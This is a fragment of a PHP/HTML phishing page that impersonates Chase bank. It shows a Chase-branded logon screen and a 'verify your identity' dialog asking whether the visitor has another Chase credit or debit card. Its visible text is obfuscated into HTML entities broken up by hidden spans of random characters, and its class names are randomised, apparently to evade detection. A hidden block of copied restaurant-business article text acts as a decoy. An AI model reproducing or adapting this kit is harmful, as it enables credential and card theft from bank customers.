                            <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> dialogTitle" tabindex="-1"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#87;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#113;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;&period;</h1>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> dialogMessage"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;&sol;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<strong><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</strong>&comma;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;&sol;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&quot;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;&quot;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;&apos;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&quot;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#79;&quot;&period;</div>
                        </div>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> dialogButtonContainer">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-6 col-sm-3 col-sm-offset-3">
                                <button type="button" id="notwo" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#79;</span> </button>
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-6 col-sm-3">
                                <button type="button" id="yestwo" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;</span> </button>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    </div>

    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui modal" id="loading" style="display:none;">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> dialog vertical-center util print-position-initial" role="dialog">
            <section class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> dialogContent">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> modalContent">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                        <img id="loading-image" src="./img/loading.gif" />
                    </div>

                </div>
            </section>
        </div>
    </div>

    <div>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> homepage" tabindex="-1">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-container">
                <header class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> toggle-aria-hidden">
                    <div id="hdrlog" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon header jpui transparent navigation bar" style="display:block;">
                        <a>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> chase logo"></div>
                        </a>
                    </div>
                    <div id="hdrup" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon header jpui transparent navigation bar" style="background: transparent;background-image: linear-gradient(to bottom, rgba(11, 110, 253, 0.88) 0, rgba(11, 110, 253, 0.49) 50%, rgba(0, 0, 0, 0) 100%); display:none;">
                        <a>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> chase logo"></div>
                        </a>
                    </div>
                </header>
                <main>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> container logon">
                        <div>
                            <div>
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui background image fixed">
                                    <style type="text/css">
                                        .jpui.background.image {
                                            background-image: url(./img/mobilenight.jpeg);
                                            filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                            -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                        }
                                        
                                        @media (min-width:320px) {
                                            .jpui.background.image {
                                                background-image: url(./img/mobilenight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:992px) {
                                            .jpui.background.image {
                                                background-image: url(./img/tabletnight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:1024px) {
                                            .jpui.background.image {
                                                background-image: url(./img/desktopnight.jpeg);
                                            }
                                        }
                                    </style>
                                </div>
                            </div>
                        </div>
						<div style="display:none;" id="toc-wrapper_1-0" class="comp toc-wrapper mntl-block">
<div id="toc-wrapper__below_1-0" class="comp toc-wrapper__below mntl-block">
<figure id="figure_3-0" class="comp figure--primary figure primary-image-figure">
<div class="figure__media">
<div class="img-placeholder" style="padding-bottom:66.6%;">
<img src="https://www.thebalancesmb.com/thmb/_KaLy6S6xqss1s7DhK-5uzlZsMY=/950x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png" srcset="https://www.thebalancesmb.com/thmb/RlhZsE95TaxohoUSbejI8jLwwaQ=/400x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 400w, https://www.thebalancesmb.com/thmb/TSUT3AvhieraUdEfAieo8SMQoKI=/537x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 537w, https://www.thebalancesmb.com/thmb/88RfA_LlBvQWcExPsqW-YWDdqJs=/674x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 674w, https://www.thebalancesmb.com/thmb/_KaLy6S6xqss1s7DhK-5uzlZsMY=/950x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 950w" alt="How to Start a New Restaurant" class=" mntl-primary-image figure__img">
</div>
</div>
<figcaption id="mntl-figure-caption_1-0" class="comp mntl-figure-caption figure-article-caption">
<span class="figure-article-caption-owner"><p>The Balance /&nbsp;&#8203;Ashley DeLeon</p></span>
</figcaption>
</figure>
<div id="sponsorship-wrapper_3-0" class="comp sponsorship-wrapper mntl-block"></div>
<div id="article-meta_1-0" class="comp article-meta mntl-block" data-tracking-container="true">
<div id="article-meta__byline_1-0" class="comp article-meta__byline mntl-block">
<div id="byline_1-0" class="comp byline mntl-byline mntl-block" data-tracking-container="true">
<span id="mntl-byline__text_1-0" class="comp mntl-byline__text mntl-text-block">
By</span>
<div id="mntl-byline__name_1-0" class="comp mntl-byline__name mntl-block mntl-dynamic-tooltip--trigger" data-tooltip="Lorri Mealey has nearly a decade of restaurant experience, including owning and operating her own restaurant in Western Maine." data-tooltip-position-x="left" data-tooltip-position-y="top">
<div id="mntl-bio-tooltip_1-0" class="comp mntl-bio-tooltip money-bio-tooltip mntl-block">
<div id="mntl-bio-tooltip__top_1-0" class="comp mntl-bio-tooltip__top mntl-block">
<div id="mntl-bio-tooltip__main_1-0" class="comp mntl-bio-tooltip__main mntl-block">
<div id="mntl-bio-tooltip__name_1-0" class="comp mntl-bio-tooltip__name mntl-block">
<span id="mntl-bio-tooltip__prelink_1-0" class="comp mntl-bio-tooltip__prelink mntl-text-block"></span>
<a href="https://www.thebalancesmb.com/lorri-mealey-2888222" id="mntl-bio-tooltip__link_1-0" class=" mntl-bio-tooltip__link mntl-text-link" data-tracking-container="true"><span class="link__wrapper">Full Bio</span></a>
<span id="mntl-bio-tooltip__postlink_1-0" class="comp mntl-bio-tooltip__postlink mntl-text-block"></span>
<nav id="bio-social-follow_1-0" class="comp bio-social-follow" role="navigation" data-tracking-container="true">
<div class="bio-social-follow__icons">
<div class="bio-social-follow__icon-container">
<a href="https://twitter.com/abt_restaurants?lang=en" target="_blank" rel="noopener" class="bio-social-follow__icon bio-social-follow__twitter"> <span class="bio-social-follow__follow-text">Follow</span>
<svg class="icon bio-icon-twitter">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-twitter"></use>
</svg>
<span class="bio-social-follow__icon-text">Twitter</span>
</a> </div>
</div>
</nav>
</div>
<div id="mntl-bio-tooltip__bio_1-0" class="comp mntl-bio-tooltip__bio mntl-text-block">
Lorri Mealey has nearly a decade of restaurant experience, including owning and operating her own restaurant in Western Maine.</div>
</div>
</div>
<div id="mntl-bio-tooltip__bottom_1-0" class="comp mntl-bio-tooltip__bottom mntl-block">
<div id="mntl-bio-tooltip__learn-more_1-0" class="comp mntl-bio-tooltip__learn-more money-bio-tooltip__learn-more mntl-block">
<span id="mntl-text-block_3-0" class="comp mntl-text-block">
Read The Balance's </span>
<a href="/about-us#EditorialGuidelines" id="mntl-text-link_1-0" class=" mntl-text-link" data-tracking-container="true"><span class="link__wrapper">editorial policies</span></a>
</div>
</div>
</div>
<a href="https://www.thebalancesmb.com/lorri-mealey-2888222" id="mntl-byline__link_1-0" class=" mntl-byline__link mntl-text-link" data-tracking-container="true"><span class="link__wrapper">Lorri Mealey</span></a>
</div>
</div>
</div>
<div id="displayed-date_1-0" class="comp displayed-date">
Updated July 25, 2019
</div>
</div>
<div id="mntl-sc-page_1-0" class="comp structured-content expert-content mntl-sc-page mntl-block" data-sc-sticky-offset="80" data-sc-ad-label-height="20" data-sc-ad-track-spacing="100" data-sc-ad-bottom-offset="0" data-sc-min-track-height="250" data-sc-max-track-height="600" data-sc-breakpoint="50em" data-sc-load-immediate="4" data-sc-content-positions="[300, 1, 1, 1250, 1, 1, 1, 1]" data-bind-scroll-on-start="true">
<p id="mntl-sc-block_1-0-1" class="comp text-passage mntl-sc-block mntl-sc-block-html">
<a href="https://www.thebalancesmb.com/how-to-open-a-restaurant-with-no-money-4045860" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">Opening a new restaurant</a> can be daunting. There are so many things to consider – from choosing the right location to finding financing to selecting the right name. And, of course, <a href="https://www.thebalancesmb.com/restaurant-bar-equipment-checklist-2888863" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">buying equipment</a> and hiring staff.
</p>
<div id="mntl-sc-block_1-0-2" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_2-0" class="comp mntl-block">
<div id="billboard1-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard1-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="1050" style="top: 134px;">
<div class="spacer">
<div id="billboard1-dynamic_1-0" class="comp billboard1-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
<div id="billboard" class="wrapper" data-type="billboard" data-pos="atf" data-priority="2" data-sizes="[[300, 250], [300, 600], [160, 600], [300, 1050], [1, 2], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="3bd3f410f0f24094bfd884a7691b57e5" data-auction-floor-value="25"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<a class="heading-toc" id="concept-location-and-name"></a> <h2 id="mntl-sc-block_1-0-3" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Concept, Location, and Name&nbsp; </span> </h2>
<p id="mntl-sc-block_1-0-5" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The first step in opening a new restaurant is deciding what <a href="https://www.thebalancesmb.com/types-of-restaurants-2888525" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">type</a> of restaurant it is going to be. Do you want to open a high-end fine dining restaurant? A casual 1950s-style diner? Do you have a specific type of cuisine in mind, such as Italian, French, or Indian? Perhaps a microbrewery or a pub.
</p>
<div id="mntl-sc-block_1-0-6" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_3-0" class="comp mntl-block">
<div id="billboard2-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard2-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="600" style="top: 1284px;">
<div class="spacer">
<div id="billboard2-dynamic_1-0" class="comp billboard2-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
<div id="billboard2" class="wrapper" data-type="billboard" data-pos="btf1" data-priority="3" data-sizes="[[300, 250], [300, 600], [300, 601], [160, 600], [300, 251], [2, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="c576ea9adcaf44bfbabaa91b4190c8c7" data-auction-floor-value="15"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard2_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<div id="mntl-sc-block_1-0-7" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-8" class="comp theme-experttipimportant mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Location, location, location. It can make or break a restaurant.</p></div>
</div>
</div>
<p id="mntl-sc-block_1-0-10" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Before you&nbsp;sign a <a href="https://www.thebalancesmb.com/rent-a-restaurant-2888547" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">lease</a> for your restaurant location, do your homework. Is the restaurant <a href="https://www.thebalancesmb.com/choosing-a-location-for-your-restaurant-2888635" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">located</a> in a busy area with plenty of foot traffic? If not, is there enough parking? Have several other restaurants opened and closed in the same spot?
</p>
